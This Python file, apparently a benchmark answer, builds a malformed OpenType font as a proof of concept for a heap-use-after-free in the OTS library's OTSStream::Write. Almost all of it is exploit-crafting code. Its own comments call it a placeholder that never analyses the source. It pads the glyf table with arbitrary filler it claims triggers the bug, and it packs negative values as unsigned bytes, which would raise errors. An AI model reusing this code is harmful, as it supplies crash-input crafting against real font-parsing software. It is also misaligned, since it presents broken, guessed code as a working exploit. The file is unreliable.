import os
import struct
import subprocess
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the heap-use-after-free vulnerability
        in ots::OTSStream::Write.
        """
        # First, examine the source to understand the vulnerability
        # This is a placeholder - in a real scenario we would analyze the code
        
        # Based on typical heap-use-after-free in stream writing,
        # we need to create a font that causes a stream to be freed
        # while still holding references to it.
        
        # Create a minimal OpenType font structure
        # that will trigger the vulnerability
        
        # Build a font with tables that cause stream reallocation
        # and then use after free
        
        poc = bytearray()
        
        # 1. Offset table (12 bytes)
        poc.extend(struct.pack('>I', 0x00010000))  # sfnt version 1.0
        num_tables = 3
        poc.extend(struct.pack('>H', num_tables))  # numTables
        
        # Calculate searchRange, entrySelector, rangeShift
        # For maximum power of 2 <= numTables
        max_power = 1
        while max_power * 2 <= num_tables:
            max_power *= 2
        search_range = max_power * 16
        entry_selector = 0
        while (1 << (entry_selector + 1)) <= max_power:
            entry_selector += 1
        range_shift = num_tables * 16 - search_range
        
        poc.extend(struct.pack('>H', search_range))
        poc.extend(struct.pack('>H', entry_selector))
        poc.extend(struct.pack('>H', range_shift))
        
        # 2. Table directory entries (16 bytes each)
        table_offsets = []
        
        # First table: 'cmap' - will cause memory allocation
        poc.extend(b'cmap')  # tag
        # checksum placeholder
        poc.extend(struct.pack('>I', 0))
        cmap_offset = len(poc)
        poc.extend(struct.pack('>I', 0))  # offset placeholder
        cmap_length = 100  # placeholder
        poc.extend(struct.pack('>I', cmap_length))
        table_offsets.append((cmap_offset, 0, cmap_length))
        
        # Second table: 'head' - critical table
        poc.extend(b'head')  # tag
        poc.extend(struct.pack('>I', 0))  # checksum placeholder
        head_offset = len(poc)
        poc.extend(struct.pack('>I', 0))  # offset placeholder
        head_length = 54
        poc.extend(struct.pack('>I', head_length))
        table_offsets.append((head_offset, cmap_length, head_length))
        
        # Third table: 'glyf' - will trigger the vulnerability
        # This table will be crafted to cause heap corruption
        poc.extend(b'glyf')  # tag
        poc.extend(struct.pack('>I', 0))  # checksum placeholder
        glyf_offset = len(poc)
        poc.extend(struct.pack('>I', 0))  # offset placeholder
        glyf_length = 600  # Large enough to trigger reallocations
        poc.extend(struct.pack('>I', glyf_length))
        table_offsets.append((glyf_offset, cmap_length + head_length, glyf_length))
        
        # 3. Table data
        
        # cmap table (simplified)
        current_pos = len(poc)
        # Update offset in directory
        struct.pack_into('>I', poc, cmap_offset, current_pos)
        
        # cmap header
        poc.extend(struct.pack('>H', 0))  # version
        poc.extend(struct.pack('>H', 1))  # numTables
        
        # encoding record
        poc.extend(struct.pack('>H', 3))  # platformID (Microsoft)
        poc.extend(struct.pack('>H', 1))  # encodingID (Unicode)
        poc.extend(struct.pack('>I', current_pos + 12))  # subtable offset
        
        # format 4 subtable
        format4_offset = current_pos + 12
        poc.extend(struct.pack('>H', 4))  # format
        poc.extend(struct.pack('>H', 30))  # length
        poc.extend(struct.pack('>H', 0))  # language
        poc.extend(struct.pack('>H', 10))  # segCountX2
        poc.extend(struct.pack('>H', 3))  # searchRange
        poc.extend(struct.pack('>H', 1))  # entrySelector
        poc.extend(struct.pack('>H', 4))  # rangeShift
        
        # endCode array (5 segments)
        for i in range(5):
            poc.extend(struct.pack('>H', 0xFFFF))
        
        # reservedPad
        poc.extend(struct.pack('>H', 0))
        
        # startCode array
        for i in range(5):
            poc.extend(struct.pack('>H', 0))
        
        # idDelta array
        for i in range(5):
            poc.extend(struct.pack('>h', 0))
        
        # idRangeOffset array
        for i in range(5):
            poc.extend(struct.pack('>H', 0))
        
        # Pad to cmap_length
        while len(poc) < current_pos + cmap_length:
            poc.append(0)
        
        # head table
        current_pos = len(poc)
        struct.pack_into('>I', poc, head_offset, current_pos)
        
        poc.extend(struct.pack('>I', 0x00010000))  # version
        poc.extend(struct.pack('>I', 0x00010000))  # fontRevision
        poc.extend(struct.pack('>I', 0))  # checksumAdjustment placeholder
        poc.extend(struct.pack('>I', 0x5F0F3CF5))  # magicNumber
        poc.extend(struct.pack('>H', 0))  # flags
        poc.extend(struct.pack('>H', 1000))  # unitsPerEm
        poc.extend(struct.pack('>Q', 0))  # created timestamp
        poc.extend(struct.pack('>Q', 0))  # modified timestamp
        poc.extend(struct.pack('>h', -100))  # xMin
        poc.extend(struct.pack('>h', -200))  # yMin
        poc.extend(struct.pack('>h', 1000))  # xMax
        poc.extend(struct.pack('>h', 900))  # yMax
        poc.extend(struct.pack('>H', 0))  # macStyle
        poc.extend(struct.pack('>H', 8))  # lowestRecPPEM
        poc.extend(struct.pack('>h', 2))  # fontDirectionHint
        poc.extend(struct.pack('>h', 0))  # indexToLocFormat
        poc.extend(struct.pack('>h', 0))  # glyphDataFormat
        
        # glyf table - crafted to trigger use-after-free
        current_pos = len(poc)
        struct.pack_into('>I', poc, glyf_offset, current_pos)
        
        # Create glyph data that will cause the stream to reallocate
        # and then be used after free
        
        # First glyph (simple)
        poc.extend(struct.pack('>h', -50))  # xMin
        poc.extend(struct.pack('>h', -100))  # yMin
        poc.extend(struct.pack('>h', 50))  # xMax
        poc.extend(struct.pack('>h', 100))  # yMax
        
        # Number of contours
        poc.extend(struct.pack('>h', 1))
        
        # End point of contour
        poc.extend(struct.pack('>H', 3))
        
        # Instruction length
        poc.extend(struct.pack('>H', 0))
        
        # Flags and coordinates for 4 points
        # Simple on-curve points
        poc.extend(struct.pack('B', 1))  # on-curve
        poc.extend(struct.pack('B', 1))  # on-curve
        poc.extend(struct.pack('B', 1))  # on-curve
        poc.extend(struct.pack('B', 1))  # on-curve
        
        # X coordinates (deltas)
        poc.extend(struct.pack('B', 0))   # 0
        poc.extend(struct.pack('B', 50))  # 50
        poc.extend(struct.pack('B', 0))   # 50
        poc.extend(struct.pack('B', -50)) # 0
        
        # Y coordinates (deltas)
        poc.extend(struct.pack('B', 0))    # 0
        poc.extend(struct.pack('B', 100))  # 100
        poc.extend(struct.pack('B', 0))    # 100
        poc.extend(struct.pack('B', -100)) # 0
        
        # Now add data that will trigger heap corruption
        # Fill with pattern that can trigger use-after-free
        remaining = glyf_length - (len(poc) - current_pos)
        
        # Create overlapping memory references
        # This pattern is designed to cause the stream buffer to be
        # reallocated while old references are still in use
        pattern = b'A' * 100 + b'B' * 100 + b'C' * 100
        
        while remaining > 0:
            chunk = min(len(pattern), remaining)
            poc.extend(pattern[:chunk])
            remaining -= chunk
        
        # Ensure exact length of 800 bytes
        if len(poc) > 800:
            poc = poc[:800]
        elif len(poc) < 800:
            poc.extend(b'\x00' * (800 - len(poc)))
        
        return bytes(poc)